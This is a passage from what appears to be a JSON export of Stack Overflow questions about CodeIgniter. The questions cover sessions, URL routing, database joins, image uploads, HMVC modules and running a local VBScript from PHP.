controller</p>\n\n<pre><code>function popup_contact()\n{\n    $this-&gt;datatables\n         -&gt;select('first_name,last_name,salutation,number,birthday,group_name')\n         -&gt;from('tb_contact')\n         -&gt;join('tb_contact_group', 'tb_contact.contact_group_id = tb_contact_group.contact_group_id');          \n\n    echo $this-&gt;datatables-&gt;generate();             \n\n}\n</code></pre>\n"},{"tags":["codeigniter","session","expiration","lifetime"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12779188,"title":"codeigniter session expiration","body":"<p>I got a codeigniter session issue that I hasn´t been able to solve. My sessions always expires even if my expiration time is set to \"infinity\". I´ve tried to set the expiration time to 0 and also a high number such as 604800 (one week).</p>\n\n<p>At the moment my variables looks like this:</p>\n\n<pre><code>$config['sess_cookie_name'] = 'ci_session';\n$config['sess_expiration']  = 604800;\n$config['sess_expire_on_close'] = FALSE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = TRUE;\n$config['sess_table_name']  = 'ci_sessions';\n$config['sess_match_ip']    = FALSE;\n$config['sess_match_useragent'] = FALSE;\n$config['sess_time_to_update']  = 300;\n</code></pre>\n\n<p>I´ve tried a lot of different combinations and a couple of different libraries but I can´t seem to find a solution for the problem. Do I have to change gc_maxlifetime in my php.ini file to make it work? I´ve read a couple of threads about my problem here on stackoverflow but none of them have helped me.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["php","codeigniter","object","fluent-interface"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12778505,"title":"Adding properties to an object using a fluent interface","body":"<p>I have a class like below:</p>\n\n<pre><code>$structure = new stdClass();\n\n$structure-&gt;template-&gt;view_data-&gt;method       = 'get_sth';\n$structure-&gt;template-&gt;view_data-&gt;lang         = $lang;\n$structure-&gt;template-&gt;view_data-&gt;id_page      = $id_page;\n$structure-&gt;template-&gt;view_data-&gt;media_type   = 'ibs';\n$structure-&gt;template-&gt;view_data-&gt;limit        = '0';\n$structure-&gt;template-&gt;view_data-&gt;result_type  = 'result';\n</code></pre>\n\n<p>And I am curious about if it can be written like below?</p>\n\n<pre><code>$structure-&gt;template-&gt;view_data-&gt;method       = 'get_sth_else',\n                               -&gt;lang         = $lang,\n                               -&gt;id_page      = $id_page,\n                               -&gt;media_type   = 'ibs',\n                               -&gt;limit        = '0',\n                               -&gt;result_type  = 'result',\n\n                    -&gt;another-data-&gt;method    = 'sth_else',\n                                  -&gt;type      = 'sth',\n                                  -&gt;different = 'sth sth';\n</code></pre>\n"},{"tags":["codeigniter","url"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12761981,"title":"Removing/hiding controller name in the URL - Codeigniter","body":"<p>I've tried several ways to remove the controller name in my url but nothing works</p>\n\n<p>my url are like : <strong>www.mysite.com/controller/function</strong> and I just want <strong>www.mysite.com/function</strong></p>\n\n<p>I've tried the routes but the controller name still remain in my url :/\nAny trick to do that properly ?</p>\n\n<p>Thanks!</p>\n"},{"tags":["codeigniter","orm"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":58,"score":-1,"question_id":12775891,"title":"How to use ORM in Codeigniter to do select from two table joined together?","body":"<p>I want to achieve same thing like the SQL code below (it works)shown in ORM in Codeigniter:</p>\n\n<pre><code>SELECT question.`id`,`title`,`question`,`answer` FROM answer LEFT JOIN question ON answer.question_id = question.id WHERE question.`id` = 1\n</code></pre>\n\n<p>I made the following code:</p>\n\n<pre><code>$this-&gt;db-&gt;select('question.id, question.title, question.question, answer.answer')-&gt;from('answer')-&gt;join('question', 'answer.question_id = question_id')-&gt;where('question.id',1);\n$query = $this-&gt;db-&gt;get();\n</code></pre>\n\n<p>it doesn't work, instead of select <code>question.id = 1</code>, it get all the answer, it seems like the where clause doesn't work at all</p>\n\n<p>I provide the table structure below</p>\n\n<pre><code>CREATE TABLE `question` (\n  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,\n  `title` varchar(128) NOT NULL DEFAULT '',\n  `question` text NOT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=latin1;\n\n\nCREATE TABLE `answer` (\n  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,\n  `question_id` int(11) unsigned NOT NULL,\n  `answer` text NOT NULL,\n  PRIMARY KEY (`id`),\n  KEY `question_id` (`question_id`),\n  CONSTRAINT `answer_ibfk_1` FOREIGN KEY (`question_id`) REFERENCES `question` (`id`) ON DELETE CASCADE ON UPDATE CASCADE\n) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=latin1;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12755630,"title":"How does codeigniter 2 handle classes and objects","body":"<p>I'm new to CodeIgniter, and I was wondering how the system handles all classes and objects. If i have a lot of models, views and controllers does the system release them, when not in use or do i have to do it myself?</p>\n\n<p>an example:</p>\n\n<pre><code>class Myclass extends CI_Controller {\n\n public function __construct(){\n      parent::_construct();\n }\n\n public function some_function(){\n    $this-&gt;load-&gt;view(\"some_view\");\n }\n</code></pre>\n\n<p>}</p>\n\n<p>I also got a question on the database part. Does CodeIgniter save query results, or do I have to release every query, I don't want to be saved with <code>$query-&gt;free_result()</code> ?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12773178,"title":"Codeigniter $_GET in models?","body":"<p>I've got a URL parameter I need to get to pass to a PHP MySQL Variable. \nLets say for instance my URL is:</p>\n\n<pre><code>www.facebook.com/?ref=logo \n</code></pre>\n\n<p>Normally it'd $_GET to get the value of ref.  How would I go about doing this in a CodeIgniter model? From what I understand, $_GET doesn't work with CI?</p>\n"},{"tags":["php","html","apache","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12771595,"title":"Codeigniter hiding function name BUT keeping functionality","body":"<p>I have a site with a default controller \"home.\"  There is a login form on the home page, and pressing the login button calls the function 'validate_credentials()', a function in the home controller.</p>\n\n<p>When a user fails to enter correct login info, from within the validate_credentials function I call:</p>\n\n<pre><code>$this-&gt;index()\n</code></pre>\n\n<p>Which basically reloads the homepage, and fills in the email address form with the previous info.  I would call</p>\n\n<pre><code>redirect('home');\n</code></pre>\n\n<p>but then I cant pre-fill the email address form unless I create a session variable.</p>\n\n<p>After a user enters incorrect info, the url reads:\nhttp ://www.website.com/home/validate_credentials</p>\n\n<p>I just want:\nhttp ://www.website.com\nor even:\nhttp ://www.website.com/home</p>\n\n<p>but using routes</p>\n\n<pre><code>$route['home'] = 'home/validate_credentials';\n</code></pre>\n\n<p>It actually changes the functions being called.  I just want to change the url.  Is this possible?</p>\n"},{"tags":["codeigniter","menu"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12771607,"title":"codeigniter menu library","body":"<p>I'm searching a good menu library for codeigniter, what could be implemented fast as possible and should be simple as possible. Could somebody give me some useful tips where to search for and if there are some of out there, which one to chose?\nThanks in advanced</p>\n"},{"tags":["php","codeigniter","iis","com"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":186,"score":2,"question_id":12605189,"title":"Can 32-Bit PHP run a .vbs script on a 64-Bit IIS Server?","body":"<p>There is a vbscript that we must run to consolidate information gathered in a custom web application into our management software. The .vbs is in the same folder as the web application which is built in CodeIgniter 2.</p>\n\n<p>Here is the controller code:</p>\n\n<pre><code>public function saveToPM( $budgetType ){\n    // run it \n    $obj = new COM( 'WScript.Shell' ); \n\n    if ( is_object ( $obj ) ) { \n        $obj-&gt;Run( 'cmd /C wscript.exe D:\\pamtest\\myload.vbs', 0, true );\n        var_dump($obj-&gt;Run);\n    } else { \n        echo 'can not create wshell object'; \n    } // end if\n\n    $obj = null;\n\n    //$this-&gt;load-&gt;view('goodPush');\n} // end saveToPM function\n</code></pre>\n\n<p>We have enabled DCon in the php.ini file and used dcomcnfg to enable permissions for the user.</p>\n\n<p>I borrowed the code from <a href=\"http://www.sitepoint.com/forums/showthread.php?505709-run-a-vbs-from-php\" rel=\"nofollow\">http://www.sitepoint.com/forums/showthread.php?505709-run-a-vbs-from-php</a>.</p>\n\n<p>The screen echos \"Code executed\" but the vbscript does not run.</p>\n\n<p>We have been fighting with this for a while so any help is GREATLY appreciated.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":51,"score":-1,"question_id":12771201,"title":"Adding the values in a foreach before displaying the final result","body":"<p>I have a shopping cart which passes a ship value of each item.</p>\n\n<p>When I want to display the total shipping cost I tried the code below.</p>\n\n<pre><code>foreach ($cart as $item)\necho $ship = $this-&gt;cart-&gt;format_number($item['ship']);\n</code></pre>\n\n<p>Assume I have three items in my cart.</p>\n\n<ul>\n<li>Item 1 = $30 shipping</li>\n<li>Item 2 = $20 shipping</li>\n<li>Item 3 = $30 shipping</li>\n</ul>\n\n<p>I need to <code>add</code> these values before echoing out the <code>result</code> However my code outputs <code>30.0020.0030.00</code></p>\n\n<h1>question:</h1>\n\n<p>How do I <code>add</code> the values before echoing out the result?</p>\n\n<p>--useful info-- using codeigniter shopping cart </p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":114,"score":0,"question_id":12770471,"title":"Code Igniter CRUD app: thumbnail image doesn't upload. Receive database error because NULL","body":"<p>Making a form that will accept a bunch of textual data and an image upload.</p>\n\n<p>Keep getting this error when adding new item to both tables:</p>\n\n<blockquote>\n  <p>Error Number: 1048</p>\n  \n  <p>Column 'id_path' cannot be null</p>\n  \n  <p>INSERT INTO <code>thumbnails</code> (<code>id_path</code>, <code>id_data_row</code>) VALUES (NULL, 17)</p>\n  \n  <p>Filename: C:\\wamp\\www\\project\\system\\database\\DB_driver.php</p>\n  \n  <p>Line Number: 330</p>\n</blockquote>\n\n<p>What I'm trying to do is add text data(stuff like title, text, price, etc.) into one table(<strong>data</strong>) and then upload an image and add its full upload path(as primary key in <strong>thumbnails</strong> table) and the id of the inserted text data row(to link it with the thumbnail in <strong>thumbnails</strong> table) into <strong>thumbnails</strong> table.</p>\n\n<p>For some reason it keeps passing NULL as the full upload path to thumbnails table.</p>\n\n<p><strong>crud.php</strong>(the controller):</p>\n\n<pre><code>function add()\n        {\n            //Set validation properties\n            $this-&gt;_set_fields();\n\n            //Set common properties\n            $data['title'] = 'Add new data row';\n            $data['message'] = '';\n            $data['action'] = site_url('crud/addDataRow');\n            $data['link_back'] = anchor('crud/index', 'Back to list', array('class' =&gt; 'back'));\n\n            //Load the view\n            $this-&gt;load-&gt;view('templates/header', $data);\n            $this-&gt;load-&gt;view('pages/crud_edit', $data);\n            $this-&gt;load-&gt;view('templates/footer');\n        }\n\n        function addDataRow()\n        {\n            //Set common properties\n            $data['title'] = 'Add new data row';\n            $data['action'] = site_url('crud/addDataRow');\n            $data['link_back'] = anchor('crud/index/', 'Back to list', array('class' =&gt; 'back'));\n\n            //Set validation properties\n            $this-&gt;_set_fields();\n            $this-&gt;_set_rules();\n\n            //Run validation\n            if($this-&gt;form_validation-&gt;run() == FALSE)\n            {\n                $data['message'] = '';\n            }\n            else\n            {\n                //Save the data\n                $full_file_path = null;\n                $config['allowed_types'] = 'gif|jpg|png';\n                $config['max_size'] = '100';\n                $config['max_width']  = '1024';\n                $config['max_height']  = '768';\n                $path_to_uploads='./uploads';\n                $config['upload_path'] = $path_to_uploads;\n                $this-&gt;load-&gt;library('upload', $config);\n                //add this\n                $this-&gt;upload-&gt;initialize($config);\n                if (!$this-&gt;upload-&gt;do_upload()){\n                    $error = $this-&gt;upload-&gt;display_errors();\n                    echo \"&lt;script&gt;alert($error);&lt;/script&gt;\";\n                }else{\n                    $upload_data=$this-&gt;upload-&gt;data();\n                    $file_name=$upload_data['file_name'];\n                    $full_file_path = $path_to_uploads.'/'.$file_name;\n                }\n\n\n                $data_row = array(\n                    'title' =&gt; $this-&gt;input-&gt;post('title'),\n                    'text' =&gt; $this-&gt;input-&gt;post('text'),\n                    'price' =&gt; $this-&gt;input-&gt;post('price'),\n                    'status' =&gt; $this-&gt;input-&gt;post('status'),\n                    'type' =&gt; $this-&gt;input-&gt;post('type')\n                );\n\n                $id = $this-&gt;crud_model-&gt;save($data_row);\n\n                $thumbnail_row = array(\n                    'id_path' =&gt; $full_file_path,\n                    'id_data_row' =&gt; $id\n                );\n\n                $this-&gt;crud_model-&gt;save_thumbnail($thumbnail_row);\n\n                //Set form input name=\"id\"\n                $this-&gt;form_validation-&gt;id = $id;\n\n                //Set user message\n                $data['message'] = '&lt;div class=\"success\"&gt;New data row added!&lt;/div&gt;';\n            }\n\n            $this-&gt;load-&gt;view('templates/header', $data);\n            $this-&gt;load-&gt;view('pages/crud_edit', $data);\n            $this-&gt;load-&gt;view('templates/footer');\n        }\n</code></pre>\n\n<p><strong>crud_model.php</strong>(the model):</p>\n\n<pre><code>//Add new data row\n        function save($data)\n        {\n\n            $this-&gt;db-&gt;insert($this-&gt;tbl_data, $data);\n            return $this-&gt;db-&gt;insert_id();\n        }\n\n        //Add the thumbnail upload path and id of the row in data table to link them\n        function save_thumbnail($data)\n        {\n            $this-&gt;db-&gt;insert($this-&gt;tbl_thumbnails, $data);\n            return $this-&gt;db-&gt;insert_id();\n        }\n</code></pre>\n\n<p><strong>EDIT(html form code):</strong></p>\n\n<p><strong>crud_edit.php</strong>(html form code for <strong>adding</strong> a new item or <strong>updating</strong> an existing one):</p>\n\n<pre><code>&lt;div id=\"contentColumn\"&gt;\n    &lt;h1&gt;&lt;?php echo $title; ?&gt;&lt;/h1&gt;\n    &lt;?php echo $message; ?&gt;\n    &lt;form method=\"post\" action=\"&lt;?php echo $action; ?&gt;\" multipart=\"multipart\"&gt;\n        &lt;div class=\"data\"&gt;\n            &lt;table&gt;\n                &lt;tr&gt;\n                    &lt;td width=\"30%\"&gt;ID&lt;/td&gt;\n                    &lt;td&gt;\n                        &lt;input type=\"text\" name=\"id\" disabled=\"disabled\" class=\"text\" value=\"&lt;?php echo set_value('id'); ?&gt;\"/&gt;\n                        &lt;input type=\"hidden\" name=\"id\" value=\"&lt;?php echo set_value('id',$this-&gt;form_data-&gt;id); ?&gt;\"/&gt;\n                    &lt;/td&gt;\n                &lt;/tr&gt;\n                &lt;tr&gt;\n                    &lt;td valign=\"top\"&gt;Title&lt;span style=\"color:red;\"&gt;*&lt;/span&gt;&lt;/td&gt;\n                    &lt;td&gt;\n                        &lt;input type=\"text\" name=\"title\" class=\"text\" value=\"&lt;?php echo set_value('title',$this-&gt;form_data-&gt;title); ?&gt;\"/&gt;\n                        &lt;?php echo form_error('title'); ?&gt;\n                    &lt;/td&gt;\n                &lt;/tr&gt;\n                &lt;tr&gt;\n                    &lt;td valign=\"top\"&gt;Text&lt;span style=\"color:red;\"&gt;*&lt;/span&gt;&lt;/td&gt;\n                    &lt;td&gt;\n                        &lt;textarea name=\"text\" class=\"text\"&gt;\n                            &lt;?php echo set_value('text',$this-&gt;form_data-&gt;text); ?&gt;\n                        &lt;/textarea&gt;\n                        &lt;?php echo form_error('text'); ?&gt;\n                    &lt;/td&gt;\n                &lt;/tr&gt;\n                &lt;tr&gt;\n                    &lt;td valign=\"top\"&gt;Price&lt;span style=\"color:red;\"&gt;*&lt;/span&gt;&lt;/td&gt;\n                    &lt;td&gt;\n                        &lt;input type=\"text\" name=\"price\" class=\"text\" value=\"&lt;?php echo set_value('price',$this-&gt;form_data-&gt;price); ?&gt;\"/&gt;\n                        &lt;?php echo form_error('price'); ?&gt;\n                    &lt;/td&gt;\n                &lt;/tr&gt;\n                &lt;tr&gt;\n                    &lt;td valign=\"top\"&gt;Thumbnail&lt;span style=\"color:red;\"&gt;*&lt;/span&gt;&lt;/td&gt;\n                    &lt;td&gt;\n                        &lt;?php echo form_upload(array('name'=&gt;'thumb', 'type'=&gt;'file', 'accept'=&gt;'image/*'))?&gt;\n                        &lt;!--&lt;input type=\"file\" name=\"thumb\" size=\"20\" /&gt;--&gt;\n                        &lt;?php echo form_error('thumb'); ?&gt;\n                    &lt;/td&gt;\n                &lt;/tr&gt;\n                &lt;!--\n                &lt;tr&gt;\n                    &lt;td valign=\"top\"&gt;Images&lt;span style=\"color:red;\"&gt;*&lt;/span&gt;&lt;/td&gt;\n                    &lt;td&gt;\n                        &lt;input type=\"text\" name=\"images\" class=\"text\" value=\"&lt;?php echo set_value('images',$this-&gt;form_data-&gt;images); ?&gt;\"/&gt;\n                        &lt;?php echo form_upload(array('name'=&gt;'images', 'type'=&gt;'file', 'multiple'=&gt;'multiple', 'accept'=&gt;'image/*'))?&gt;\n                        &lt;?php echo form_error('images'); ?&gt;\n                    &lt;/td&gt;\n                &lt;/tr&gt;\n                --&gt;\n                &lt;tr&gt;\n                    &lt;td valign=\"top\"&gt;Status&lt;/td&gt;\n                    &lt;td&gt;\n                        &lt;input type=\"text\" name=\"status\" class=\"text\" value=\"&lt;?php echo set_value('status',$this-&gt;form_data-&gt;status); ?&gt;\"/&gt;\n                        &lt;?php echo form_error('status'); ?&gt;\n                    &lt;/td&gt;\n                &lt;/tr&gt;\n                &lt;tr&gt;\n                    &lt;td valign=\"top\"&gt;Type&lt;span style=\"color:red;\"&gt;*&lt;/span&gt;&lt;/td&gt;\n                    &lt;td&gt;\n                        &lt;input type=\"text\" name=\"type\" class=\"text\" value=\"&lt;?php echo set_value('type',$this-&gt;form_data-&gt;type); ?&gt;\"/&gt;\n                        &lt;?php echo form_error('type'); ?&gt;\n                    &lt;/td&gt;\n                &lt;/tr&gt;\n                &lt;tr&gt;\n                    &lt;td&gt;&amp;nbsp;&lt;/td&gt;\n                    &lt;td&gt;&lt;input type=\"submit\" value=\"Save\" /&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n            &lt;/table&gt;\n        &lt;/div&gt;\n    &lt;/form&gt;\n    &lt;br /&gt;\n    &lt;?php echo $link_back; ?&gt;\n&lt;/div&gt;\n</code></pre>\n"},{"tags":["codeigniter","popupwindow"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":48,"score":-1,"question_id":12768963,"title":"How can I make a pop-up window project in codeigniter?","body":"<p>Hi I am beginner at codeigniter.\nwant to make project, where I can edit the entry form in a pop-up window.\nIt can be possible easily in javascript - jquery...\nBut Iwant to make it in codeigniter. Do you help me to send the corresponding codes ?</p>\n"},{"tags":["codeigniter","hmvc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12768973,"title":"rout the admin controllers in with HMVC","body":"<p>i have a problem with HMVC  </p>\n\n<p>i have admin controller in all my modules like this</p>\n\n<pre>\n- modules \n\n - users \n     - controllers \n         - admin.php \n         - users.php\n     - views\n         - admin_create_user.php\n         - admin_view_users.php\n         - signup.php\n         - login.php\n\n - news\n     - controllers\n         - admin.php\n         - news.php\n     - views\n         - admin_disply_news.php\n         - admin_create_news.php\n         - view_news.php\n</pre>\n\n<hr>\n\n<p>now when go to users admin the URL  will be link this </p>\n\n<ul>\n<li>domain.com/users/admin/method .</li>\n<li>domain.com/news/admin/method .</li>\n</ul>\n\n<p>but i need it to be </p>\n\n<ul>\n<li><strong>domain.com/admin/users/method</strong></li>\n<li><strong>domain.com/admin/news/method</strong></li>\n</ul>\n"},{"tags":["php","codeigniter","tankauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12765166,"title":"Codeigniter: Creating New Classes to interact with databse","body":"<p>Ok, so i am using codeigniter and tankauth. I want to create a function where a user can ask a question and the question is stored in the databse. Seems simple enough although I seem to be running into  issues once i start creating new classes for the controllers, libraries, and models. Here is what i have done so far:</p>\n\n<p>VIEW: welcome.php (this is the first page, the user can go to the ask_question page with the anchor at the end, well when it works).</p>\n\n<pre><code>&lt;?php echo anchor('/ask/ask_question', 'Ask a Question'); ?&gt;&lt;/br&gt;\n</code></pre>\n\n<p>VIEW: ask_question.php</p>\n\n<pre><code>Ask a questsion bro!&lt;/br&gt;\n&lt;/br&gt;\n&lt;?php \n$title = array(\n           'name' =&gt; 'title',\n           'id' =&gt; 'title',\n           'value' =&gt; set_value('title'),\n           'maxlength' =&gt; 750,\n           'size' =&gt; 30,\n           'style' =&gt; 'width: 100px',\n           );\n$body = array(\n          'name' =&gt; 'body',\n          'id' =&gt; 'body',\n          'value' =&gt; set_value('body'),\n          'maxlength' =&gt; 5000,\n          'size' =&gt; 30,\n          'style' =&gt; 'width: 100px',\n          );\n?&gt;\n&lt;?php echo form_open('/Ask/ask_question'); ?&gt;\n&lt;table&gt;\n    &lt;tr&gt;\n        &lt;td&gt;&lt;?php echo form_label('Title', $title['id']); ?&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;?php echo form_input($title); ?&gt;&lt;/td&gt;\n    &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error($title['name']); ?&gt;&lt;?php echo isset($errors[$title['name']])?$errors[$title['name']]:''; ?&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n        &lt;td&gt;&lt;?php echo form_label('Body', $body['id']); ?&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;?php echo form_input($body); ?&gt;&lt;/td&gt;\n    &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error($body['name']); ?&gt;&lt;?php echo isset($errors[$body['name']])?$errors[$body['name']]:''; ?&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n&lt;/table&gt;\n&lt;?php echo form_submit('ask_question', 'Ask Question'); ?&gt;\n&lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>CONTROLLER: ask.php</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass ask extends CI_Controller\n{\n    function __construct()\n    {\n        parent::__construct();\n\n        $this-&gt;load-&gt;helper(array('form','url'));\n        $this-&gt;load-&gt;library('Ask_Question');\n        $this-&gt;load-&gt;library('tank_auth');\n        $this-&gt;load-&gt;library('form_validation');\n        $this-&gt;lang-&gt;load('tank_auth');\n    }\n\n    function index()\n    {\n      if (!$this-&gt;tank_auth-&gt;is_logged_in()) {\n        redirect('/auth/login/');\n      }\n      else {\n        $this-&gt;load-&gt;view('/ask/ask_question/');\n      }\n    }\n\n    function ask_question()\n    {\n      if (!$this-&gt;tank_auth-&gt;is_logged_in()) {\n        redirect('/auth/login/');\n      }\n      elseif ($this-&gt;tank_auth-&gt;is_logged_in(FALSE)) {\n        redirect('/auth/send_again/');\n      }\n      else {\n        $this-&gt;form_validation-&gt;set_rules('title', 'Title', 'trim|required|xss_clean|min_length[15]');\n        $this-&gt;form_validation-&gt;set_rules('body', 'Body', 'trim|required|xss_clean|min_length[15]');\n        if ($this-&gt;form_validation-&gt;run()) {\n          if (!is_null($data = $this-&gt;Ask_Question-&gt;ask_question(\n                                     $this-&gt;form_validation-&gt;set_value('title'),\n                                     $this-&gt;form_validation-&gt;set_value('body')))) {\n        $data['site_name'] = $this-&gt;config-&gt;item('website_name', 'tank_auth');\n          }\n          else {\n        $errors = $this-&gt;Ask_Question-&gt;get_error_message();\n        foreach ($errors as $k =&gt; $v) $data['errors'][$k] = $this-&gt;lang-&gt;line($v);\n          }\n        }\n      }\n      $this-&gt;load-&gt;view('/ask/ask_question/');\n    }\n}\n</code></pre>\n\n<p>LIBRARIES: Ask_Question.php</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nrequire_once('phpass-0.1/PasswordHash.php');\n\ndefine('STATUS_ACTIVATED', '1');\ndefine('STATUS_NOT_ACTIVATED', '0');\n\n/**\n * Tank_auth\n *\n * Authentication library for Code Igniter.\n *\n * @package     Tank_auth\n * @author      Ilya Konyukhov (http://konyukhov.com/soft/)\n * @version     1.0.9\n * @based on    DX Auth by Dexcell (http://dexcell.shinsengumiteam.com/dx_auth)\n * @license     MIT License Copyright (c) 2008 Erick Hartanto\n */\nclass Ask_Question\n{\n    private $error = array();\n\n    function __construct()\n    {\n        $this-&gt;ci =&amp; get_instance();\n\n        $this-&gt;ci-&gt;load-&gt;config('tank_auth', TRUE);\n\n        $this-&gt;ci-&gt;load-&gt;library('session');\n        $this-&gt;ci-&gt;load-&gt;database();\n        $this-&gt;ci-&gt;load-&gt;model('questions');\n\n        // Try to autologin\n        $this-&gt;autologin();\n    }\n\n    function ask_question($title, $body)\n    {\n      $user_id = $this-&gt;ci-&gt;session-&gt;userdata('user_id');\n      $class_id = '1';\n      $tag1 = 'KENT';\n      $this-&gt;ci-&gt;questions-&gt;ask_question($user_id, $class_id, $title, $body, $tag1);\n      return NULL;\n    }\n\n    function get_error_message()\n    {\n        return $this-&gt;error;\n    }\n}\n</code></pre>\n\n<p>MODELS: questions.php</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\n/**\n * Users\n *\n * This model represents user authentication data. It operates the following tables:\n * - user account data,\n * - user profiles\n *\n * @package Tank_auth\n * @author  Ilya Konyukhov (http://konyukhov.com/soft/)\n */\nclass questions extends CI_Model\n{\n    private $table_name         = 'users';          // user accounts\n    private $profile_table_name = 'user_profiles';  // user profiles\n\n    function __construct()\n    {\n        parent::__construct();\n\n        $ci =&amp; get_instance();\n        $this-&gt;table_name           = $ci-&gt;config-&gt;item('db_table_prefix', 'tank_auth').$this-&gt;table_name;\n        $this-&gt;profile_table_name   = $ci-&gt;config-&gt;item('db_table_prefix', 'tank_auth').$this-&gt;profile_table_name;\n    }\n\n    function ask_question($user_id, $class_id, $title, $body, $tag1)\n    {\n      $this-&gt;db-&gt;insert('questions', array('user_id'=&gt;$user_id,'class_id'=&gt;$class_id, 'question_title'=&gt;$title, 'question_content'=&gt;$body, 'focus_peak_1'=&gt;$tag1)); \n      return NULL;\n    }\n}\n</code></pre>\n\n<p>I have done stuff like this before using the already created class no problem. I have not yet created my own classes. I am not sure if i am doing it write (I just copied the way the current classes are set up). So please let me know if I I have any errors or anything. Right now I cannot get my form to show up at all. the page is just blank.</p>\n"},{"tags":["php","codeigniter","model","libraries","error-logging"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12768332,"title":"call libraries from model in codeigniter","body":"<p>I'm trying to call a library from model in codeigniter but doesn't want to fire and I don't really know how to debug it, I have been trying to use codeigniters default logging method but doesn't show anything. My code looks as it follows.</p>\n\n<pre><code>class Model_products extends CI_Model{\n\n\n    function __construct(){\n        parent::__construct();\n        $this-&gt;load-&gt;library('ApiClient');\n        log_message('error', $this-&gt;load-&gt;library('ApiClient'));\n\n}       \n}\n\n/application/libraries/ApiClient.php\n\nlibary final class ApiClient\n{}\n</code></pre>\n"},{"tags":["php","javascript","codeigniter","hmvc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12767536,"title":"Codeigniter HMVC modules and javascript files","body":"<p>I've just started learning about HMVC in CodeIgniter.</p>\n\n<p>So far I've been enjoying having modular controllers, but problems come when I wish to include javascript.</p>\n\n<p>It seems to me that I'll have to include javascript file from the view instead of the widgets which isn't really good because I tend to forget which widgets has to come with which javascript file.</p>\n\n<p>Anyone has a better way to do it?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":99,"score":0,"question_id":12644914,"title":"CodeIgniter UPDATE query not working","body":"<p>I have a problem with a CodeIgniter <code>UPDATE</code> query.</p>\n\n<p>My model:</p>\n\n<pre><code>function update_order($id,$old_order){\n\n    //Update The order\n    $query = $this-&gt;db-&gt;query(\"SELECT * FROM cat WHERE `cat_order`='$old_order' \");\n    $row =  $query-&gt;row();\n\n    $this-&gt;db-&gt;query(\"UPDATE cat SET cat_order='\".$row-&gt;cat_order.\"' WHERE id='\".$id.\"' \");\n    $this-&gt;db-&gt;query(\"UPDATE cat SET cat_order='$old_order' WHERE id ='\".$row-&gt;id.\"' \");\n\n}  \n</code></pre>\n\n<p>The <code>SELECT</code> query is working 100% but the two <code>UPDATE</code> queries are not. </p>\n"},{"tags":["database","codeigniter","configuration"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":188,"score":0,"question_id":7187228,"title":"codeigniter database configuration programmatically form user input","body":"<p>Can anyone help me ? </p>\n\n<p>How can I configure the CI database settings programmatically ? I saw this with other systems like OSCommerce, Joomla, Wordpress etc..</p>\n\n<p>The user needs to submit a form with database information.</p>\n"},{"tags":["php","sql","codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12762447,"title":"Why is my codeigniter database query returning NULL on the field it is successfully searching on","body":"<p>I am really confused as to why I am getting a NULL value for my item_id which is a required field in my table and is what I am searching on in the first place,</p>\n\n<p>here is the relevant part of my controller:</p>\n\n<pre><code>$item_id=$this-&gt;uri-&gt;segment(4);\n$page_data['row'] = $this-&gt;item_model-&gt;get_item($item_id, TRUE);\nvar_dump($page_data['row']);\n</code></pre>\n\n<p>and here is my model:</p>\n\n<pre><code>function get_item($id, $admin=FALSE){\n        $this-&gt;db\n            -&gt;select('*')\n            -&gt;from('item_entries')\n            -&gt;where('item_entries.item_id', $id)\n            -&gt;join('item_categories_rel', 'item_categories_rel.item_id = item_entries.item_id')\n            -&gt;join('item_descriptions', 'item_descriptions.item_id = 